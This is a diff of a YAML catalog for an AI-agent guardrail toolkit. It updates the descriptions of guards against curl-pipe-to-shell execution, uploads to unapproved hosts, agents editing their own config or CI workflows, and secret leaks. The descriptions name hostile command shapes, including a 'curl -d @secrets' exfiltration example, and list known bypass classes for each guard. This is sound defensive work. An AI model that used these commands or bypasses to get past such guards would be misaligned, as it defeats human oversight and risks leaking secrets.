@@ -1,5 +1,14 @@
 catalog: chock-base
 source: https://github.com/open-coder-ai/chock-catalog
+# eval_cases: total cases in base/<id>/evals/suite.yaml (`suite.cases`), agent-mode/tier-3
+#   cases included.
+# eval_executed: the subset of those cases that carry an `execute:` block -- a
+#   deterministic command chock's own eval runner can replay against the real guard/gate
+#   and score `block`/`allow` without a human or an agent in the loop. A case with no
+#   `execute:` block is authored but not machine-executable (agent-mode material chock
+#   check reports as "no executable form"); it counts toward eval_cases, never toward
+#   eval_executed. Both counts are verified against each policy's suite by
+#   tools/check_registry.py -- drift here fails CI the same way a stale version does.
 policies:
 - id: agent-discipline
   path: base/agent-discipline
@@ -15,20 +24,22 @@ policies:
     code. avoid: skipping verification, deleting assertions, leaving unused code.'
 - id: block-curl-pipe-sh
   path: base/block-curl-pipe-sh
-  version: 0.0.1
+  version: 0.0.2
   artifact: rule
   enforcement: advise
   mandatory: false
   mechanism: guard script
   enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
-  eval_cases: 27
-  eval_executed: 27
+  eval_cases: 34
+  eval_executed: 34
   description: 'Best-effort guard against piping a network download straight into a shell or script
-    interpreter: curl|wget|iwr ... | sh/bash/zsh/python/perl/ruby/node (bare or path-qualified, including
-    subshell groups and sudo/exec/command/env wrappers), bash -c "$(curl ...)", bash <(curl ...),
-    and the PowerShell iwr ... | iex form. Downloading to a file, or piping a fetch into a non-interpreter
-    tool (jq, tar, grep), stays allowed. Known bypass classes include aliases, variable indirection,
-    base64/obfuscated payloads, env-var-prefixed interpreters, and non-standard fetch clients. This
+    interpreter: curl|wget|iwr ... | sh/bash/zsh/python/perl/ruby/node (bare, path-qualified, or
+    QUOTED ("sh", ''bash''), including subshell groups and transparent wrappers --
+    sudo/exec/command/env/xargs/nohup/timeout/nice/stdbuf/ionice/setsid -- in front of it, bash -c
+    "$(curl ...)", bash <(curl ...), and the PowerShell iwr ... | iex form. Downloading to a file,
+    or piping a fetch into a non-interpreter tool (jq, tar, grep), stays allowed. Known bypass
+    classes include aliases, variable indirection, base64/obfuscated payloads, env-var-prefixed
+    interpreters, and non-standard fetch clients. This
     is friction, not a security boundary.'
 - id: block-destructive-commands
   path: base/block-destructive-commands
@@ -86,25 +97,25 @@ policies:
     hook failure instead of skipping validation.
 - id: block-unapproved-egress
   path: base/block-unapproved-egress
-  version: 0.0.1
+  version: 0.0.2
   artifact: rule
   enforcement: advise
   mandatory: false
   mechanism: guard script
   enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
-  eval_cases: 32
-  eval_executed: 32
+  eval_cases: 38
+  eval_executed: 38
   description: 'Best-effort guard against exfiltration through the tool channel: a network command
-    (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file
-    -- to a host outside the egress allowlist. The allowlist defaults to package registries and code
-    hosting and is meant to be extended with your org''s own domains; a host matches by exact name
-    or ".<entry>" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target
-    is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not
-    a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing
-    a determined adversary needs real sandboxing. Known bypass classes include scheme-less URL targets
-    (host extraction needs the http(s):// prefix), a request driven by curl''s implicit ~/.curlrc,
-    combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime.
-    Escape: ''pragma: allowlist egress''.'
+    (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file,
+    --post-file -- to a host outside the egress allowlist. The allowlist defaults to package
+    registries and code hosting and is meant to be extended with your org''s own domains; a host
+    matches by exact name or ".<entry>" suffix. Fetch-only traffic is left alone -- the target
+    is upload to an unapproved host, not normal dependency traffic. A schemeless or
+    protocol-relative target is checked too, from the last non-flag token, but only when no
+    explicit http(s):// URL appears anywhere -- once one has, it alone decides. Tool-time FLOOR,
+    not a network sandbox: it stops the obvious reflex, not a determined adversary. Known
+    bypasses: ~/.curlrc, combined short flags, obfuscated payloads, non-standard clients, a
+    language runtime. Escape: ''pragma: allowlist egress''.'
 - id: block-unpinned-agent-components
   path: agentic-security/block-unpinned-agent-components
   version: 0.0.3
@@ -458,21 +469,23 @@ policies:
     monitoring. Do NOT use for a single hijacked request within a supervised session — that is `owasp-asi01-agent-goal-hijack`.
 - id: block-wildcard-agent-permissions
   path: base/block-wildcard-agent-permissions
-  version: 0.0.4
+  version: 0.0.5
   artifact: hook
   enforcement: block
   mandatory: false
   mechanism: content_regex
   enforces: enforced-at-commit
-  eval_cases: 11
-  eval_executed: 11
-  description: 'The mechanizable slice of excessive agency, enforced at two points: at commit (the
-    git hook, over staged changes) and at agent tool-use (over a tool call''s arguments, as the agent
-    writes) -- agent permission grants that allow everything. A settings file whose shell grant or
-    allow-list is a bare wildcard hands the agent unlimited tool authority for every future session,
-    in a file reviewers rarely read as code. The agent-world twin of block-wildcard-iam: scope grants
-    to what the task needs (e.g. Bash(git status:*)). Escape: ''pragma: allowlist broad-agency'' on
-    the same line.'
+  eval_cases: 16
+  eval_executed: 16
+  description: 'The mechanizable slice of excessive agency, enforced at two points: at commit (the git hook,
+    over staged changes) and at agent tool-use (over a tool call''s arguments, as the agent
+    writes) -- agent permission grants that allow everything. A settings file whose shell grant
+    or allow-list is a bare wildcard hands the agent unlimited tool authority for every future
+    session, in a file reviewers rarely read as code. The agent-world twin of
+    block-wildcard-iam: scope grants to what the task needs (e.g. Bash(git status:*)). The
+    allow/alwaysAllow/tools/defaultMode keys match whether or not YAML-style config quotes them,
+    word-bounded so "disallow"/"allowlist" are not mistaken for "allow". Escape: ''pragma:
+    allowlist broad-agency'' on the same line.'
 - id: pin-github-actions
   path: base/pin-github-actions
   version: 0.0.2
@@ -496,7 +509,29 @@ policies:
     stay out of scope.'
 - id: protect-agent-config
   path: base/protect-agent-config
-  version: 0.0.5
+  version: 0.0.6
+  artifact: rule
+  enforcement: advise
+  mandatory: false
+  mechanism: guard script
+  enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
+  eval_cases: 31
+  eval_executed: 31
+  description: 'Guard against an agent hand-editing its own guardrails. Agent instruction files (AGENTS.md
+    and the per-agent wrappers), permission files (.claude/settings.json, .mcp.json) and
+    vendored enforcement (.chock/bin/, .chock/compiled/) define what the agent may do -- so a
+    shell command that rewrites them is the agent modifying its own authority (MITRE ATLAS
+    AML.T0081). The guard refuses shell write-commands targeting those paths; reads pass, and
+    regeneration through `chock sync` passes because the tool writes them itself. Best-effort
+    and deliberately coarse: a write signal (a `>`/`>>` redirect, or a writer verb like
+    rm/cp/sed -i) is scoped to its own clause of the command line, so it must actually target
+    the protected path, not merely appear alongside it; a glued-on separator or a non-redirect
+    writer''s own operand are not resolved that finely. The ''chock: approved-config-change''
+    marker is friction plus an audit trail, not authentication; the check an agent cannot
+    self-approve is the commit-time gate and CI.'
+- id: protect-ci-workflows
+  path: base/protect-ci-workflows
+  version: 0.0.2
   artifact: rule
   enforcement: advise
   mandatory: false
@@ -504,54 +539,39 @@ policies:
   enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
   eval_cases: 24
   eval_executed: 24
-  description: 'Guard against an agent hand-editing its own guardrails. Agent instruction files (AGENTS.md
-    and the per-agent wrappers), permission files (.claude/settings.json, .mcp.json) and vendored
-    enforcement (.chock/bin/, .chock/compiled/) define what the agent may do -- so a shell command
-    that rewrites them is the agent modifying its own authority (MITRE ATLAS AML.T0081; the AIVSS
-    self-modification factor). The guard refuses shell write-commands targeting those paths; reads
-    pass, and regeneration through `chock sync` passes because the tool writes them itself rather
-    than through shell editing. Best-effort and deliberately coarse: a compound command that both
-    reads a protected file and writes elsewhere may be refused -- rewrite it in two steps. The ''chock:
-    approved-config-change'' escape marker is friction plus an audit trail, not authentication --
-    the agent can write it too; the check an agent cannot self-approve is the commit-time gate and
-    CI.'
-- id: protect-ci-workflows
-  path: base/protect-ci-workflows
-  version: 0.0.1
-  artifact: rule
-  enforcement: advise
-  mandatory: false
-  mechanism: guard script
-  enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
-  eval_cases: 19
-  eval_executed: 19
   description: 'Guard against an agent weakening the automated checks that review its own work. CI/CD
-    workflow files (.github/workflows/), the composite actions they call (.github/actions/) and the
-    dependency-update automation (.github/dependabot.yml) define what must pass before a change lands
-    -- so a shell command that rewrites or deletes them is the agent removing the gate that would
-    catch it. The guard refuses shell write-commands targeting those paths; reads pass, and tool-driven
-    regeneration (chock sync) passes because it writes through the tool, not shell editing. Best-effort
-    and deliberately coarse: a compound command that both reads a protected file and writes elsewhere
-    may be refused -- rewrite it in two steps. The ''chock: approved-config-change'' escape marker
-    is friction plus an audit trail, not authentication -- the agent can write it too; the check an
-    agent cannot self-approve is branch protection and required-status-checks enforced server-side.'
+    workflow files (.github/workflows/), the composite actions they call (.github/actions/) and
+    the dependency-update automation (.github/dependabot.yml) define what must pass before a
+    change lands -- so rewriting or deleting them is the agent removing the gate that would
+    catch it. The guard refuses shell write-commands targeting those paths; reads pass, and
+    tool-driven regeneration (chock sync) passes. Best-effort and deliberately coarse: a write
+    signal (a `>`/`>>` redirect, or a writer verb like rm/cp/sed -i/git checkout) is scoped to
+    its own clause of the command line, so it must actually target the protected path, not
+    merely appear alongside it; a glued-on separator or a non-redirect writer''s own operand are
+    not resolved that finely. The ''chock: approved-config-change'' marker is friction plus an
+    audit trail, not authentication; the check an agent cannot self-approve is server-side
+    branch protection.'
 - id: protect-commit-privacy
   path: base/protect-commit-privacy
-  version: 0.0.3
+  version: 0.0.4
   artifact: rule
   enforcement: advise
   mandatory: false
   mechanism: guard script
   enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
-  eval_cases: 20
-  eval_executed: 20
-  description: 'Keep the development conversation out of git history. Agent-authored commits narrate
-    by default -- who asked for what, which discussion decided it, what the plan was -- and on a public
-    repo that narration is published forever. The guard refuses git commit commands whose message
-    (inline -m/--message or the file behind -F/--file) contains process-leak markers; the rule tells
-    the agent to describe the change, not the conversation, and to propose sensitive messages to the
-    human before committing. Best-effort: markers are a narrow deny-list, and a message the human
-    explicitly approves can say anything -- edit the marker list in the guard, the content is yours.'
+  eval_cases: 23
+  eval_executed: 23
+  description: 'Keep the development conversation out of git history. Agent-authored commits narrate by
+    default -- who asked for what, which discussion decided it, what the plan was -- and on a
+    public repo that narration is published forever. The guard refuses git commit commands whose
+    message (inline -m/--message or the file behind -F/--file) contains process-leak markers;
+    the rule tells the agent to describe the change, not the conversation, and to propose
+    sensitive messages to the human before committing. A commit or gh pr create|edit wrapped in
+    sh -c/bash -c (hiding it inside one opaque argv token) falls back to scanning the raw
+    command text, scoped to argv[0] actually being a shell interpreter so a command that merely
+    echoes the pattern as documentation still passes. Best-effort: markers are a narrow
+    deny-list, and a message the human explicitly approves can say anything -- edit the marker
+    list in the guard, the content is yours.'
 - id: protect-main-branch
   path: base/protect-main-branch
   version: 0.0.1
@@ -586,14 +606,14 @@ policies:
     indirection, sourced files, interpreters, indirect scripts. This is friction, not a security boundary.'
 - id: scan-secrets
   path: base/scan-secrets
-  version: 0.0.6
+  version: 0.0.7
   artifact: hook
   enforcement: block
   mandatory: true
   mechanism: content_regex
   enforces: enforced-at-commit
-  eval_cases: 20
-  eval_executed: 20
+  eval_cases: 26
+  eval_executed: 26
   description: 'Blocks known credential patterns -- vendor key prefixes, private-key blocks, and key/token/password
     assignments -- at two enforcement points: at commit (the git hook, over staged changes) and at
     agent tool-use (the mcp-gateway / agent write guard, over a tool call''s arguments), so a secret
@@ -627,22 +647,22 @@ policies:
     with `chock enable verify-dependency-exists` after populating .chock/dependency-allowlist.txt.'
 - id: verify-mcp-allowlist
   path: base/verify-mcp-allowlist
-  version: 0.0.1
+  version: 0.0.2
   artifact: rule
   enforcement: advise
   mandatory: false
   mechanism: guard script
   enforces: best-effort (pre-tool-use, once hooks are installed; fails open if the hook crashes)
-  eval_cases: 15
-  eval_executed: 15
-  description: 'Gate MCP server configuration as protected content. A shell write to .mcp.json is
-    refused unless every mcpServers entry on the line matches a name+source pair on the allowlist
-    -- an unlisted name blocks, and an allowed name whose command/args/url changed blocks too (catches
-    a server renamed to an allowed name but pointed elsewhere). The allowlist ships inside this guard''s
-    own script, protected like every policy''s implementations/ source -- edit only with ''chock:
-    approved-config-change''. Claude Code''s .mcp.json only: agentseam 0.2.1 records no per-vendor
-    MCP config path, so other agents are left out, not guessed at. Tool-time (Bash) only, best-effort:
-    PreToolUse fails open on a crash, a file-write tool bypasses this guard, a write with no visible
-    content fails closed. No commit-time gate -- chock 0.8.0 has no gate kind pairing name+source
-    against an external allowlist. Matching and path checks are exact-string and substring-coarse.
-    No pragma for .mcp.json -- matching the allowlist is the only way through.'
+  eval_cases: 17
+  eval_executed: 17
+  description: 'Gate MCP server configuration as protected content. A shell write to .mcp.json is refused
+    unless every mcpServers entry on the line matches a name+source pair on the allowlist -- an
+    unlisted name blocks, and an allowed name whose command/args/url changed blocks too (catches
+    a server renamed to an allowed name but pointed elsewhere). The allowlist ships inside this
+    guard''s own script, protected like every policy''s implementations/ source -- edit only
+    with ''chock: approved-config-change''. Claude Code''s .mcp.json only. Tool-time (Bash)
+    only, best-effort: PreToolUse fails open on a crash, a file-write tool bypasses this guard,
+    a write with no visible content fails closed. No commit-time gate. A write signal is scoped
+    to its own clause of the command line, so a writer or redirect elsewhere -- or stderr merely
+    suppressed -- cannot condemn a plain read of .mcp.json. Matching and path checks are
+    otherwise exact-string and substring-coarse. No pragma for .mcp.json.'
